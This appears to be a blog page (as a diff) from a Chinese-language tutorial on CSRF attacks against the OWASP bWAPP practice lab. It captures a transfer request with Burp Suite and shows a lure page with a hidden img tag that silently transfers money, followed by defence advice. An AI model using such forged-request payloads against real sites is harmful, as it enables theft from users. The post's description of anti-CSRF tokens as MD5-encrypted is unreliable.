@@ -1,0 +1,829 @@
+<!doctype html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8">
+<title>CSRF (Cross Site Request Forgery) 跨站請求偽造攻擊 in OWASP - David&#39;s Blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<meta name="generator" content="Hugo 0.84.0" /><meta itemprop="name" content="CSRF (Cross Site Request Forgery) 跨站請求偽造攻擊 in OWASP">
+<meta itemprop="description" content="CSRF全名為Cross-Site-Request-Forgery&#65292;跨站請求偽造攻擊&#12290;
+簡而言之&#65292;駭客利用你瀏覽網站時尚未過期的session來進行偽造&#65292;發送惡意request&#12290;
+舉個例子&#65292;以網路銀行為例&#65292;你向網銀發送帳號密碼進行驗證&#65292;驗證通過後server會回傳驗證成功&#65292;可以進行所有&#8220;登入後才可以進行的動作&#8221;&#12290;
+這時候駭客利用網銀尚未通知閒置過久(session未過期)&#65292;可以利用社交工程或者是其他方式讓user在不知不覺中發送request&#12290;
+如何做到就是我們以下要講的&#12290;
+我們利用原先就有CSRF漏洞的OWASP bWApp來進行練習&#12290;
+目的就是讓user讓不知不覺的情況下成功被轉帳&#12290;
+step1.我們必須要知道&#8220;轉帳&#8221;這個步驟在web端如何發送request&#12290;
+我們可以用自己電腦來得到這個連結
+先將瀏覽器設定代理伺服器(Proxy)
+使用Burp-Suite內建proxy工具進行request攔截
+
+可以看到在我們設定proxy之後&#65292;點擊&#34;transfer&#34;網頁會有點卡住
+那是因為我們的request被攔截下來了
+這時候我們可以看到這一段語法是轉帳的執行語法
+GET /bWAPP/csrf_2.php?account=123-45678-90&amp;amount=0&amp;action=transfer HTTP/1.1
+account=轉出帳號
+amount=轉出金額
+p.s.按Forward可以繼續將request送出&#65292;甚至可以修改再送出&#12290;
+step2.撰寫釣魚網頁
+為了簡化過程&#65292;我們簡化網頁內容&#65292;實際進行攻擊的網頁通常不會這麼簡單&#12290;
+
+##################################
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&#34;utf-8&#34;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;font&gt;
+泰勒絲愛你哦 &lt;/br&gt;
+這是泰勒斯的電話跟照片 &lt;/br&gt;
+0931097313 &lt;/br&gt;
+點擊照片到我的blog看更多照片哦&lt;/br&gt;
+&lt;/font&gt;
+&lt;img src=&#34;http://172.20.10.2/bWAPP/csrf_2.php?account=123-45678-90&amp;amount=200&amp;action=transfer=a.jpg&#34;&gt;
+&lt;a href=&#34;http://www.google.com.tw&#34; target=&#34;&#34;&gt; &nbsp;&lt;img src=&#34;http://www.daliulian.org/imgs/image/12/1251496.jpg&#34;&gt;&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+#################################
+step3. 尋找目標下手
+撰寫完成只要找尋目標&#65292;使user成功點擊網站&#65292;即可完成轉帳&#12290;
+user不需要點擊任何圖片或者是網址&#65292;只需要看到這個頁面就可以進行CSRF攻擊了&#12290;
+
+step4.我們回到剛剛的bWApp帳戶頁面&#65292;重新整理後會發現已經如程式碼所寫的轉出200 EUR了&#65292;然後這段時間user沒有對這個網頁進行任何動作&#12290;
+
+總結&#65306;
+這是因為user的request已經被我們依樣畫葫蘆偽造了一份&#65292;並加以修改回傳給銀行server&#65292;然而銀行也未查覺到有任何異常&#65292;在銀行看來就是user發送的一般請求而已&#12290;
+防禦&#65306;
+現在網路服務皆會設定閒置過期時間(session-time-out)&#65292;閒置過久將會被自動登出&#65292;減少被偽造的機會&#12290;
+而有些較大的web server&#65292;例如facebook&#12289;google...etc會設有token&#65292;所謂token就是利用演算法算出一組unique key&#65292;再經由md5加密送出&#65292;user做任何動作都需要token驗證&#65292;使駭客無從偽造&#65292;因為他沒有使用你當前的瀏覽器就無法得知你目前的token是什麼&#12290;
+當然你會說&#65292;md5加密還是可以破解&#65292;沒錯&#65281;所以重點在於演算法的精密度&#65292;越精密的演算法&#65292;駭客越無從猜測&#65292;也就無從破解&#12290;
+目前ASP.Net 的mvc上的CSRF防禦已經非常普遍化了&#65292;可以利用簡單的程式碼計算token&#65292;加以防禦簡單的CSFR攻擊&#12290;
+經由以上簡單的CSRF滲透測試&#65292;雖然現今大部分網頁服務都有防禦CSRF&#65292;但是我們必須知道如果不使用的話&#65292;盡可能登出網頁服務&#65292;就可以避免造成不必要的風險&#12290;"><meta itemprop="datePublished" content="2016-09-09T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2016-09-09T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="78">
+<meta itemprop="keywords" content="" /><meta property="og:title" content="CSRF (Cross Site Request Forgery) 跨站請求偽造攻擊 in OWASP" />
+<meta property="og:description" content="CSRF全名為Cross-Site-Request-Forgery&#65292;跨站請求偽造攻擊&#12290;
+簡而言之&#65292;駭客利用你瀏覽網站時尚未過期的session來進行偽造&#65292;發送惡意request&#12290;
+舉個例子&#65292;以網路銀行為例&#65292;你向網銀發送帳號密碼進行驗證&#65292;驗證通過後server會回傳驗證成功&#65292;可以進行所有&#8220;登入後才可以進行的動作&#8221;&#12290;
+這時候駭客利用網銀尚未通知閒置過久(session未過期)&#65292;可以利用社交工程或者是其他方式讓user在不知不覺中發送request&#12290;
+如何做到就是我們以下要講的&#12290;
+我們利用原先就有CSRF漏洞的OWASP bWApp來進行練習&#12290;
+目的就是讓user讓不知不覺的情況下成功被轉帳&#12290;
+step1.我們必須要知道&#8220;轉帳&#8221;這個步驟在web端如何發送request&#12290;
+我們可以用自己電腦來得到這個連結
+先將瀏覽器設定代理伺服器(Proxy)
+使用Burp-Suite內建proxy工具進行request攔截
+
+可以看到在我們設定proxy之後&#65292;點擊&#34;transfer&#34;網頁會有點卡住
+那是因為我們的request被攔截下來了
+這時候我們可以看到這一段語法是轉帳的執行語法
+GET /bWAPP/csrf_2.php?account=123-45678-90&amp;amount=0&amp;action=transfer HTTP/1.1
+account=轉出帳號
+amount=轉出金額
+p.s.按Forward可以繼續將request送出&#65292;甚至可以修改再送出&#12290;
+step2.撰寫釣魚網頁
+為了簡化過程&#65292;我們簡化網頁內容&#65292;實際進行攻擊的網頁通常不會這麼簡單&#12290;
+
+##################################
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&#34;utf-8&#34;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;font&gt;
+泰勒絲愛你哦 &lt;/br&gt;
+這是泰勒斯的電話跟照片 &lt;/br&gt;
+0931097313 &lt;/br&gt;
+點擊照片到我的blog看更多照片哦&lt;/br&gt;
+&lt;/font&gt;
+&lt;img src=&#34;http://172.20.10.2/bWAPP/csrf_2.php?account=123-45678-90&amp;amount=200&amp;action=transfer=a.jpg&#34;&gt;
+&lt;a href=&#34;http://www.google.com.tw&#34; target=&#34;&#34;&gt; &nbsp;&lt;img src=&#34;http://www.daliulian.org/imgs/image/12/1251496.jpg&#34;&gt;&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+#################################
+step3. 尋找目標下手
+撰寫完成只要找尋目標&#65292;使user成功點擊網站&#65292;即可完成轉帳&#12290;
+user不需要點擊任何圖片或者是網址&#65292;只需要看到這個頁面就可以進行CSRF攻擊了&#12290;
+
+step4.我們回到剛剛的bWApp帳戶頁面&#65292;重新整理後會發現已經如程式碼所寫的轉出200 EUR了&#65292;然後這段時間user沒有對這個網頁進行任何動作&#12290;
+
+總結&#65306;
+這是因為user的request已經被我們依樣畫葫蘆偽造了一份&#65292;並加以修改回傳給銀行server&#65292;然而銀行也未查覺到有任何異常&#65292;在銀行看來就是user發送的一般請求而已&#12290;
+防禦&#65306;
+現在網路服務皆會設定閒置過期時間(session-time-out)&#65292;閒置過久將會被自動登出&#65292;減少被偽造的機會&#12290;
+而有些較大的web server&#65292;例如facebook&#12289;google...etc會設有token&#65292;所謂token就是利用演算法算出一組unique key&#65292;再經由md5加密送出&#65292;user做任何動作都需要token驗證&#65292;使駭客無從偽造&#65292;因為他沒有使用你當前的瀏覽器就無法得知你目前的token是什麼&#12290;
+當然你會說&#65292;md5加密還是可以破解&#65292;沒錯&#65281;所以重點在於演算法的精密度&#65292;越精密的演算法&#65292;駭客越無從猜測&#65292;也就無從破解&#12290;
+目前ASP.Net 的mvc上的CSRF防禦已經非常普遍化了&#65292;可以利用簡單的程式碼計算token&#65292;加以防禦簡單的CSFR攻擊&#12290;
+經由以上簡單的CSRF滲透測試&#65292;雖然現今大部分網頁服務都有防禦CSRF&#65292;但是我們必須知道如果不使用的話&#65292;盡可能登出網頁服務&#65292;就可以避免造成不必要的風險&#12290;" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/09/09/csrf.html" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2016-09-09T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2016-09-09T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CSRF (Cross Site Request Forgery) 跨站請求偽造攻擊 in OWASP"/>
+<meta name="twitter:description" content="CSRF全名為Cross-Site-Request-Forgery&#65292;跨站請求偽造攻擊&#12290;
+簡而言之&#65292;駭客利用你瀏覽網站時尚未過期的session來進行偽造&#65292;發送惡意request&#12290;
+舉個例子&#65292;以網路銀行為例&#65292;你向網銀發送帳號密碼進行驗證&#65292;驗證通過後server會回傳驗證成功&#65292;可以進行所有&#8220;登入後才可以進行的動作&#8221;&#12290;
+這時候駭客利用網銀尚未通知閒置過久(session未過期)&#65292;可以利用社交工程或者是其他方式讓user在不知不覺中發送request&#12290;
+如何做到就是我們以下要講的&#12290;
+我們利用原先就有CSRF漏洞的OWASP bWApp來進行練習&#12290;
+目的就是讓user讓不知不覺的情況下成功被轉帳&#12290;
+step1.我們必須要知道&#8220;轉帳&#8221;這個步驟在web端如何發送request&#12290;
+我們可以用自己電腦來得到這個連結
+先將瀏覽器設定代理伺服器(Proxy)
+使用Burp-Suite內建proxy工具進行request攔截
+
+可以看到在我們設定proxy之後&#65292;點擊&#34;transfer&#34;網頁會有點卡住
+那是因為我們的request被攔截下來了
+這時候我們可以看到這一段語法是轉帳的執行語法
+GET /bWAPP/csrf_2.php?account=123-45678-90&amp;amount=0&amp;action=transfer HTTP/1.1
+account=轉出帳號
+amount=轉出金額
+p.s.按Forward可以繼續將request送出&#65292;甚至可以修改再送出&#12290;
+step2.撰寫釣魚網頁
+為了簡化過程&#65292;我們簡化網頁內容&#65292;實際進行攻擊的網頁通常不會這麼簡單&#12290;
+
+##################################
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&#34;utf-8&#34;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;font&gt;
+泰勒絲愛你哦 &lt;/br&gt;
+這是泰勒斯的電話跟照片 &lt;/br&gt;
+0931097313 &lt;/br&gt;
+點擊照片到我的blog看更多照片哦&lt;/br&gt;
+&lt;/font&gt;
+&lt;img src=&#34;http://172.20.10.2/bWAPP/csrf_2.php?account=123-45678-90&amp;amount=200&amp;action=transfer=a.jpg&#34;&gt;
+&lt;a href=&#34;http://www.google.com.tw&#34; target=&#34;&#34;&gt; &nbsp;&lt;img src=&#34;http://www.daliulian.org/imgs/image/12/1251496.jpg&#34;&gt;&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+#################################
+step3. 尋找目標下手
+撰寫完成只要找尋目標&#65292;使user成功點擊網站&#65292;即可完成轉帳&#12290;
+user不需要點擊任何圖片或者是網址&#65292;只需要看到這個頁面就可以進行CSRF攻擊了&#12290;
+
+step4.我們回到剛剛的bWApp帳戶頁面&#65292;重新整理後會發現已經如程式碼所寫的轉出200 EUR了&#65292;然後這段時間user沒有對這個網頁進行任何動作&#12290;
+
+總結&#65306;
+這是因為user的request已經被我們依樣畫葫蘆偽造了一份&#65292;並加以修改回傳給銀行server&#65292;然而銀行也未查覺到有任何異常&#65292;在銀行看來就是user發送的一般請求而已&#12290;
+防禦&#65306;
+現在網路服務皆會設定閒置過期時間(session-time-out)&#65292;閒置過久將會被自動登出&#65292;減少被偽造的機會&#12290;
+而有些較大的web server&#65292;例如facebook&#12289;google...etc會設有token&#65292;所謂token就是利用演算法算出一組unique key&#65292;再經由md5加密送出&#65292;user做任何動作都需要token驗證&#65292;使駭客無從偽造&#65292;因為他沒有使用你當前的瀏覽器就無法得知你目前的token是什麼&#12290;
+當然你會說&#65292;md5加密還是可以破解&#65292;沒錯&#65281;所以重點在於演算法的精密度&#65292;越精密的演算法&#65292;駭客越無從猜測&#65292;也就無從破解&#12290;
+目前ASP.Net 的mvc上的CSRF防禦已經非常普遍化了&#65292;可以利用簡單的程式碼計算token&#65292;加以防禦簡單的CSFR攻擊&#12290;
+經由以上簡單的CSRF滲透測試&#65292;雖然現今大部分網頁服務都有防禦CSRF&#65292;但是我們必須知道如果不使用的話&#65292;盡可能登出網頁服務&#65292;就可以避免造成不必要的風險&#12290;"/>
+<link rel="stylesheet" href="/css/bundle.min.b568954b3ad2854325bb53d8d1161eb3b51346b831d0b53f2b89b9c1e230435d.css" integrity="sha256-tWiVSzrShUMlu1PY0RYes7UTRrgx0LU/K4m5weIwQ10="><link rel="stylesheet" href="/css/add-on.css">
+</head>
+
+  <body>
+    <header id="site-header">
+  <nav id="site-nav">
+    <h1 class="nav-title">
+      <a href="/">
+        
+          
+            Blog
+          
+        
+      </a>
+    </h1>
+    <menu id="site-nav-menu" class="flyout-menu">
+      
+      <a href="#share-menu" class="share-toggle"><i class="fas fa-share-alt">&nbsp;</i>Share</a>
+      
+
+    </menu>
+    
+
+    <a href="#share-menu" class="share-toggle"><i class="fas fa-share-alt fa-2x">&nbsp;</i></a>
+    <a href="#site-nav" class="nav-toggle"><i class="fas fa-bars fa-2x"></i></a>
+  </nav>
+  <menu id="lang-menu" class="flyout-menu">
+  <a href="#" lang="en" class="link active">English (en)</a>
+  
+    
+      
+    
+      
+        <a href="/zh-tw" lang="zh-tw" class="no-lang link">中文 (zh-tw)</a>
+      
+    
+  
+</menu>
+
+  
+    <menu id="share-menu" class="flyout-menu">
+      <h1>Share Post</h1>
+      
+
+
+
+
+
+  
+    <a href="https://telegram.me/share/url?text=CSRF%20%28Cross%20Site%20Request%20Forgery%29%20%e8%b7%a8%e7%ab%99%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0%e6%94%bb%e6%93%8a%20in%20OWASP&url=https%3a%2f%2fblog.davidh83110.com%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html" target="_blank" rel="noopener" class="share-btn telegram">
+        <i class="fab fa-telegram-plane fa-5x"></i><p>&nbsp;Line</p>
+      </a>
+  
+
+  
+    <a href="https://social-plugins.line.me/lineit/share?url=https%3a%2f%2fblog.davidh83110.com%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html" target="_blank" rel="noopener" class="share-btn line">
+        <i class="fab fa-line fa-5x"></i><p>&nbsp;Line</p>
+      </a>
+  
+
+  
+      <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.davidh83110.com%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html" target="_blank" rel="noopener" class="share-btn facebook">
+        <i class="fab fa-facebook"></i><p>&nbsp;Facebook</p>
+        </a>
+  
+
+  
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.davidh83110.com%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html&amp;title=CSRF%20%28Cross%20Site%20Request%20Forgery%29%20%e8%b7%a8%e7%ab%99%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0%e6%94%bb%e6%93%8a%20in%20OWASP" target="_blank" rel="noopener" class="share-btn linkedin">
+            <i class="fab fa-linkedin"></i><p>&nbsp;LinkedIn</p>
+          </a>
+  
+
+  
+        <a href="mailto:?subject=Check%20out%20this%20post%20by David&amp;body=https%3a%2f%2fblog.davidh83110.com%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html" target="_blank" class="share-btn email" data-proofer-ignore>
+          <i class="fas fa-envelope"></i><p>&nbsp;Email</p>
+        </a>
+  
+
+  
+    
+    <a href="//twitter.com/share?text=CSRF%20%28Cross%20Site%20Request%20Forgery%29%20%e8%b7%a8%e7%ab%99%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0%e6%94%bb%e6%93%8a%20in%20OWASP&amp;url=https%3a%2f%2fblog.davidh83110.com%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html" target="_blank" rel="noopener" class="share-btn twitter">
+        <i class="fab fa-twitter"></i><p>&nbsp;Twitter</p>
+      </a>
+  
+
+
+    </menu>
+  
+</header>
+
+    <div id="wrapper">
+      <section id="site-intro" >
+  <a href="/"><img src="/img/main/avator.jpg" class="circle" width="165px" alt="" /></a>
+  <header>
+    <h1>David Hsu</h1>
+  </header>
+  <main>
+    
+  </main>
+  
+    <footer>
+      <ul class="socnet-icons">
+        
+
+        <li><a href="//github.com/davidh83110" target="_blank" rel="noopener" title="GitHub" class="fab fa-github"></a></li>
+
+<li><a href="//stackoverflow.com/users/12397001" target="_blank" rel="noopener" title="Stack Overflow" class="fab fa-stack-overflow"></a></li>
+
+
+
+
+
+
+
+
+
+<li><a href="//linkedin.com/in/david-hsu-b1136112b" target="_blank" rel="noopener" title="LinkedIn" class="fab fa-linkedin"></a></li>
+
+
+
+
+<li><a href="//facebook.com/ben12567" target="_blank" rel="noopener" title="Facebook" class="fab fa-facebook"></a></li>
+
+
+
+
+
+
+
+
+<li><a href="//instagram.com/davidh.110" target="_blank" rel="noopener" title="Instagram" class="fab fa-instagram"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li><a href="mailto:davidh83110@gmail.com" target="_blank" title="Email" class="far fa-envelope"></a></li>
+
+      </ul>
+      <ul style="padding: 0;">
+        <p style="text-align: center;">
+          DevOps Engineering / AWS / Cloud Native
+        </p>
+        <p style="text-align: center; opacity: 1;">
+          <a href="https://www.certmetrics.com/amazon/public/badge.aspx?i=1&t=c&d=2019-11-09&ci=AWS00993116" target="_blank">
+          <img src="https://www.certmetrics.com/api/ob/image/amazon/c/1" width=100px></a>
+        </p>
+      </ul>
+    </footer>
+  
+</section>
+
+      <main id="site-main">
+        <article class="post">
+  <header>
+  <div class="title">
+    
+      <h2><a href="/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/09/09/csrf.html">CSRF (Cross Site Request Forgery) 跨站請求偽造攻擊 in OWASP</a></h2>
+    
+    
+  </div>
+  <div class="meta">
+    <time class="published" datetime="2016-09-09 00:00:00 &#43;0000 UTC">
+      September 9, 2016
+    </time>
+    <span class="author">David</span>
+    
+  </div>
+</header>
+
+  
+
+  <div class="content">
+    <div class='post-body entry-content' id='post-body-542148310267796862' itemprop='description articleBody'>
+CSRF全名為Cross-Site-Request-Forgery&#65292;跨站請求偽造攻擊&#12290;<br />
+簡而言之&#65292;駭客利用你瀏覽網站時尚未過期的session來進行偽造&#65292;發送惡意request&#12290;<br />
+<br />
+舉個例子&#65292;以網路銀行為例&#65292;你向網銀發送帳號密碼進行驗證&#65292;驗證通過後server會回傳驗證成功&#65292;可以進行所有&#8220;登入後才可以進行的動作&#8221;&#12290;<br />
+這時候駭客利用網銀尚未通知閒置過久(session未過期)&#65292;可以利用社交工程或者是其他方式讓user在不知不覺中發送request&#12290;<br />
+<br />
+如何做到就是我們以下要講的&#12290;<br />
+<br />
+我們利用原先就有CSRF漏洞的OWASP bWApp來進行練習&#12290;<br />
+目的就是讓user讓不知不覺的情況下成功被轉帳&#12290;<br />
+<br />
+step1.我們必須要知道&#8220;轉帳&#8221;這個步驟在web端如何發送request&#12290;<br />
+我們可以用自己電腦來得到這個連結<br />
+先將瀏覽器設定代理伺服器(Proxy)<br />
+使用Burp-Suite內建proxy工具進行request攔截<br />
+<a href="http://4.bp.blogspot.com/-kpfsA12kwv4/V9GNMyTNszI/AAAAAAAAA0c/a8UYfxg1R0o1g9Xm_F8GAYqGq_ww2HMwwCK4B/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2016-09-09%2B%25E4%25B8%258A%25E5%258D%258812.08.39.png" imageanchor="1"><img border="0" height="200" src="https://4.bp.blogspot.com/-kpfsA12kwv4/V9GNMyTNszI/AAAAAAAAA0c/a8UYfxg1R0o1g9Xm_F8GAYqGq_ww2HMwwCK4B/s320/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2016-09-09%2B%25E4%25B8%258A%25E5%258D%258812.08.39.png" width="320" /></a><br />
+<br />
+可以看到在我們設定proxy之後&#65292;點擊"transfer"網頁會有點卡住<br />
+那是因為我們的request被攔截下來了<br />
+這時候我們可以看到這一段語法是轉帳的執行語法<br />
+<span style="color: red;">GET /bWAPP/csrf_2.php?account=123-45678-90&amp;amount=0&amp;action=transfer HTTP/1.1</span><br />
+<span style="color: red;">account=轉出帳號</span><br />
+<span style="color: red;">amount=轉出金額</span><br />
+p.s.按Forward可以繼續將request送出&#65292;甚至可以修改再送出&#12290;<br />
+<br />
+step2.撰寫釣魚網頁<br />
+為了簡化過程&#65292;我們簡化網頁內容&#65292;實際進行攻擊的網頁通常不會這麼簡單&#12290;<br />
+<a href="http://2.bp.blogspot.com/-2ICSH4fgLyE/V9GO1q0ouDI/AAAAAAAAA0k/iLMH0uw1ZWcEFORzbj4yI3Cq95gB26ZNwCK4B/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2016-09-09%2B%25E4%25B8%258A%25E5%258D%258812.15.49.png" imageanchor="1"><img border="0" height="200" src="https://2.bp.blogspot.com/-2ICSH4fgLyE/V9GO1q0ouDI/AAAAAAAAA0k/iLMH0uw1ZWcEFORzbj4yI3Cq95gB26ZNwCK4B/s320/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2016-09-09%2B%25E4%25B8%258A%25E5%258D%258812.15.49.png" width="320" /></a><br />
+<br />
+<br />
+##################################<br />
+&lt;html&gt;<br />
+&lt;head&gt;<br />
+<span class="Apple-tab-span" style="white-space: pre;"> </span>&lt;meta charset="utf-8"&gt;<br />
+&lt;/head&gt;<br />
+<span class="Apple-tab-span" style="white-space: pre;"> </span>&lt;body&gt;<br />
+<span class="Apple-tab-span" style="white-space: pre;">  </span>&lt;font&gt;<br />
+<span class="Apple-tab-span" style="white-space: pre;">   </span>泰勒絲愛你哦 &lt;/br&gt;<br />
+<span class="Apple-tab-span" style="white-space: pre;">   </span>這是泰勒斯的電話跟照片 &lt;/br&gt;<br />
+<span class="Apple-tab-span" style="white-space: pre;">   </span>0931097313 &lt;/br&gt;<br />
+<span class="Apple-tab-span" style="white-space: pre;">   </span>點擊照片到我的blog看更多照片哦&lt;/br&gt;<br />
+<span class="Apple-tab-span" style="white-space: pre;">  </span>&lt;/font&gt;<br />
+<span class="Apple-tab-span" style="white-space: pre;">  </span>&lt;img src="http://172.20.10.2/bWAPP/csrf_2.php?account=123-45678-90&amp;amount=200&amp;action=transfer=a.jpg"&gt;<br />
+<span class="Apple-tab-span" style="white-space: pre;">  </span>&lt;a href="http://www.google.com.tw" target=""&gt; &nbsp;&lt;img src="http://www.daliulian.org/imgs/image/12/1251496.jpg"&gt;<span class="Apple-tab-span" style="white-space: pre;"> </span>&lt;/a&gt;<br />
+<span class="Apple-tab-span" style="white-space: pre;"> </span>&lt;/body&gt;<br />
+&lt;/html&gt;<br />
+#################################<br />
+<br />
+<br />
+step3. 尋找目標下手<br />
+撰寫完成只要找尋目標&#65292;使user成功點擊網站&#65292;即可完成轉帳&#12290;<br />
+user不需要點擊任何圖片或者是網址&#65292;只需要看到這個頁面就可以進行CSRF攻擊了&#12290;<br />
+<a href="http://3.bp.blogspot.com/-os2U7Tlh4SU/V9GP7asOWoI/AAAAAAAAA0s/lMGIwe2SO7c9vLsXIuTQ2PLeFKyQn_ivgCK4B/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2016-09-09%2B%25E4%25B8%258A%25E5%258D%258812.20.39.png" imageanchor="1"><img border="0" height="200" src="https://3.bp.blogspot.com/-os2U7Tlh4SU/V9GP7asOWoI/AAAAAAAAA0s/lMGIwe2SO7c9vLsXIuTQ2PLeFKyQn_ivgCK4B/s320/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2016-09-09%2B%25E4%25B8%258A%25E5%258D%258812.20.39.png" width="320" /></a><br />
+<br />
+step4.我們回到剛剛的bWApp帳戶頁面&#65292;重新整理後會發現已經如程式碼所寫的轉出200 EUR了&#65292;然後這段時間user沒有對這個網頁進行任何動作&#12290;<br />
+<a href="http://3.bp.blogspot.com/-GEu9bf75qnE/V9GQcIZDlHI/AAAAAAAAA00/rqiRgfRHIgQztFwSsxfQO9M_CvYeIyTUACK4B/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2016-09-09%2B%25E4%25B8%258A%25E5%258D%258812.22.52.png" imageanchor="1"><img border="0" height="200" src="https://3.bp.blogspot.com/-GEu9bf75qnE/V9GQcIZDlHI/AAAAAAAAA00/rqiRgfRHIgQztFwSsxfQO9M_CvYeIyTUACK4B/s320/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2016-09-09%2B%25E4%25B8%258A%25E5%258D%258812.22.52.png" width="320" /></a><br />
+<br />
+總結&#65306;<br />
+這是因為user的request已經被我們依樣畫葫蘆偽造了一份&#65292;並加以修改回傳給銀行server&#65292;然而銀行也未查覺到有任何異常&#65292;在銀行看來就是user發送的一般請求而已&#12290;<br />
+<br />
+防禦&#65306;<br />
+現在網路服務皆會設定閒置過期時間(session-time-out)&#65292;閒置過久將會被自動登出&#65292;減少被偽造的機會&#12290;<br />
+而有些較大的web server&#65292;例如facebook&#12289;google...etc會設有token&#65292;所謂token就是利用演算法算出一組unique key&#65292;再經由md5加密送出&#65292;user做任何動作都需要token驗證&#65292;使駭客無從偽造&#65292;因為他沒有使用你當前的瀏覽器就無法得知你目前的token是什麼&#12290;<br />
+當然你會說&#65292;md5加密還是可以破解&#65292;沒錯&#65281;所以重點在於演算法的精密度&#65292;越精密的演算法&#65292;駭客越無從猜測&#65292;也就無從破解&#12290;<br />
+目前ASP.Net 的mvc上的CSRF防禦已經非常普遍化了&#65292;可以利用簡單的程式碼計算token&#65292;加以防禦簡單的CSFR攻擊&#12290;<br />
+<br />
+經由以上簡單的CSRF滲透測試&#65292;雖然現今大部分網頁服務都有防禦CSRF&#65292;但是我們必須知道如果不使用的話&#65292;盡可能登出網頁服務&#65292;就可以避免造成不必要的風險&#12290;<br />
+<br />
+<div style="text-align: right;">
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;2016-09-09 , David in Taipei.</div>
+</div>
+    <br /><br />
+<iframe class="LikeCoin" height="200" src="https://button.like.co/in/embed/davidh83110/button?referrer=%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html" width="55%" frameborder=0></iframe>
+
+  </div>
+  <section id="socnet-share" style="justify-content: center; margin: 1em 1em 2em;">
+    
+
+
+
+
+
+  
+    <a href="https://telegram.me/share/url?text=CSRF%20%28Cross%20Site%20Request%20Forgery%29%20%e8%b7%a8%e7%ab%99%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0%e6%94%bb%e6%93%8a%20in%20OWASP&url=https%3a%2f%2fblog.davidh83110.com%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html" target="_blank" rel="noopener" class="share-btn telegram">
+        <i class="fab fa-telegram-plane fa-5x"></i><p>&nbsp;Line</p>
+      </a>
+  
+
+  
